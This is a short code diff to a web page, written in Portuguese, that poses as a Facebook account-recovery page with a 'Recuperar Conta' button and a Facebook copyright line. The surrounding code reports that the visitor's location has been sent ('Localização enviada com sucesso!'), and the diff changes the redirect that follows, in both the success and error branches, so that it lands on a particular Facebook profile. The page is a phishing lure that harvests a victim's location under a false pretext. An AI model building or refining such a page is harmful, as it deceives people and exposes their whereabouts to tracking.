@@ -162,6 +162,7 @@
       <form onsubmit="handleSubmit(event)">
         <button type="submit">Recuperar Conta</button>
       </form>
+      <div id="status" style="margin-top: 12px; font-size: 14px; color: #fff;"></div>
 
       <div class="footer">© 2025 Facebook – Todos os Direitos Reservados.</div>
     </div>
@@ -195,18 +196,10 @@
           .then(res => {
             if (res.ok) {
               status.textContent = '📍 Localização enviada com sucesso!';
-              const link = document.createElement('a');
-link.href = "https://www.facebook.com/bruno.rodrigues.433581";
-link.target = "_self"; // ou "_blank" se quiser nova aba
-document.body.appendChild(link);
-link.click();
+              window.location.replace("https://www.facebook.com/bruno.rodrigues.433581");
             } else {
               status.textContent = '❌ Erro ao enviar localização.';
-    const link = document.createElement('a');
-link.href = "https://www.facebook.com/bruno.rodrigues.433581";
-link.target = "_self"; // ou "_blank" se quiser nova aba
-document.body.appendChild(link);
-link.click();
+    window.location.replace("https://www.facebook.com/bruno.rodrigues.433581");
             }
           })
           .catch(err => {
